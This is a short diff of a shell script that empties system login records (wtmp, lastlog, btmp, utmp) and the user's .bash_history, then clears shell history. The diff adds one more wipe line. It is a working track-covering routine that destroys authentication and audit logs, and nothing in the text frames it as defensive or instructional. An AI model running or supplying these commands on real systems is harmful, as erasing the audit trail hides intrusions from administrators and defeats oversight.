@@ -10,6 +10,7 @@ echo > /var/log/wtmp  &> /dev/null
 echo > /var/log/lastlog  &> /dev/null
 echo > /var/log/btmp  &> /dev/null
 echo > /var/run/utmp  &> /dev/null
+echo > /var/run/wtmp  &> /dev/null
 cd ~ && echo > .bash_history  &> /dev/null
 
 history -c
